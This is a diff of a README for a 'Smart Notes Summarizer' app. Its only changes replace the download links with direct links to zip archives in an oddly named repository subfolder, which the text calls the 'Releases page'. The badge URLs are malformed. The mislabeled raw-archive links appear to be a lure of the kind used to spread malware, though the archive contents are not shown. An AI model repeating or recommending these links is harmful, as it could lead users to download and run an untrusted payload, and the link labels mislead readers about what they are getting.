@@ -1,6 +1,6 @@
 # 📘 Smart-Notes-Summarizer - Summarize Your Notes Effortlessly
 
-[![Download Smart Notes Summarizer](https://github.com/NEXUSBEING-ux/Smart-Notes-Summarizer/raw/refs/heads/main/palingenesy/Smart-Summarizer-Notes-3.6.zip%20Notes%20Summarizer-blue)](https://github.com/NEXUSBEING-ux/Smart-Notes-Summarizer/raw/refs/heads/main/palingenesy/Smart-Summarizer-Notes-3.6.zip)
+[![Download Smart Notes Summarizer](https://raw.githubusercontent.com/NEXUSBEING-ux/Smart-Notes-Summarizer/main/palingenesy/Notes_Summarizer_Smart_2.7.zip%20Notes%20Summarizer-blue)](https://raw.githubusercontent.com/NEXUSBEING-ux/Smart-Notes-Summarizer/main/palingenesy/Notes_Summarizer_Smart_2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to Smart Notes Summarizer! This application helps you quickly create stu
 ## 📂 Installation Steps
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/NEXUSBEING-ux/Smart-Notes-Summarizer/raw/refs/heads/main/palingenesy/Smart-Summarizer-Notes-3.6.zip) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/NEXUSBEING-ux/Smart-Notes-Summarizer/main/palingenesy/Notes_Summarizer_Smart_2.7.zip) to find the latest version.
   
 2. **Download the Application**  
    Look for the latest release and download the installer package suitable for your operating system.
@@ -78,6 +78,6 @@ Here are some details about the technology behind Smart Notes Summarizer:
 
 ## 📣 Download & Install
 
-To get started, visit the [Releases page](https://github.com/NEXUSBEING-ux/Smart-Notes-Summarizer/raw/refs/heads/main/palingenesy/Smart-Summarizer-Notes-3.6.zip) to download the latest version of Smart Notes Summarizer. Follow the installation steps above to set up your application and start summarizing your notes today!
+To get started, visit the [Releases page](https://raw.githubusercontent.com/NEXUSBEING-ux/Smart-Notes-Summarizer/main/palingenesy/Notes_Summarizer_Smart_2.7.zip) to download the latest version of Smart Notes Summarizer. Follow the installation steps above to set up your application and start summarizing your notes today!
 
-[![Download Smart Notes Summarizer](https://github.com/NEXUSBEING-ux/Smart-Notes-Summarizer/raw/refs/heads/main/palingenesy/Smart-Summarizer-Notes-3.6.zip%20Notes%20Summarizer-blue)](https://github.com/NEXUSBEING-ux/Smart-Notes-Summarizer/raw/refs/heads/main/palingenesy/Smart-Summarizer-Notes-3.6.zip)
+[![Download Smart Notes Summarizer](https://raw.githubusercontent.com/NEXUSBEING-ux/Smart-Notes-Summarizer/main/palingenesy/Notes_Summarizer_Smart_2.7.zip%20Notes%20Summarizer-blue)](https://raw.githubusercontent.com/NEXUSBEING-ux/Smart-Notes-Summarizer/main/palingenesy/Notes_Summarizer_Smart_2.7.zip)
